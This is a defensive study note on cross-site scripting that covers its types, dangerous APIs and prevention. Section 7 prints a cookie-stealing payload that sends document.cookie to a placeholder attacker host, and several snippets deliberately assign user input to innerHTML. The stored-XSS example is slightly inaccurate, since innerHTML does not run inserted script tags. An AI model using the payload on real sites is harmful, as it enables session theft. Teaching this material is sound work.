# Cross-Site Scripting (XSS)

---

## 1) What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious JavaScript into a website that runs in other users’ browsers.

---

## 2) Why is XSS dangerous?

It allows attackers to:

* steal cookies/session tokens
* hijack user accounts
* read sensitive data
* modify UI
* redirect users
* perform actions as the user

---

## 3) When does XSS happen?

* unsafe user input handling
* inserting data into DOM without sanitization
* rendering HTML from user input
* using dangerous APIs

---

## 4) Types of XSS

### 1. Stored XSS

* Script saved in database
* Executes for all users

Example:

```html
<div id="comments"></div>

<script>
  const comment = "<script>alert('Hacked')</script>";
  document.getElementById("comments").innerHTML = comment;
</script>
```

---

### 2. Reflected XSS

* Comes from URL or request
* Executes immediately

Example:

```javascript
const query = new URLSearchParams(window.location.search).get("q");
document.body.innerHTML = query;
```

---

### 3. DOM-Based XSS

* Happens in frontend JS only

Example:

```javascript
const hash = window.location.hash;
document.getElementById("app").innerHTML = hash;
```

---

## 5) Dangerous APIs

Avoid unsafe usage of:

```javascript
element.innerHTML
element.outerHTML
document.write()
eval()
setTimeout("code")
setInterval("code")
```

---

## 6) Safe vs Unsafe

### ❌ Unsafe

```javascript
element.innerHTML = userInput;
```

### ✅ Safe

```javascript
element.textContent = userInput;
```

---

## 7) Real Example Attack

```javascript
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

---

## 8) Prevention Techniques

### 1. Output Encoding

Convert special characters:

```
< → &lt;
> → &gt;
```

---

### 2. Use textContent

```javascript
element.textContent = userInput;
```

---

### 3. Input Validation

Reject suspicious input

---

### 4. Sanitization

Use libraries like DOMPurify

---

### 5. Content Security Policy (CSP)

```http
Content-Security-Policy: script-src 'self'
```

---

### 6. HttpOnly Cookies

```http
Set-Cookie: HttpOnly
```

---

### 7. Avoid Inline JS

❌ Bad:

```html
<button onclick="doSomething()">
```

✅ Good:

```javascript
button.addEventListener("click", doSomething);
```

---

## 9) Key Differences

| Type      | Source | Stored? |
| --------- | ------ | ------- |
| Stored    | DB     | Yes     |
| Reflected | URL    | No      |
| DOM       | JS     | No      |

---

## 10) Common Mistakes

* trusting user input
* using innerHTML blindly
* no sanitization
* storing raw HTML
* ignoring CSP

---

## 11) Interview Definition

XSS is a vulnerability where malicious scripts are injected into trusted web pages and executed in users’ browsers, allowing attackers to steal data or manipulate the application.

---

## 12) Golden Rule

👉 Never trust user input
👉 Always sanitize and encode output


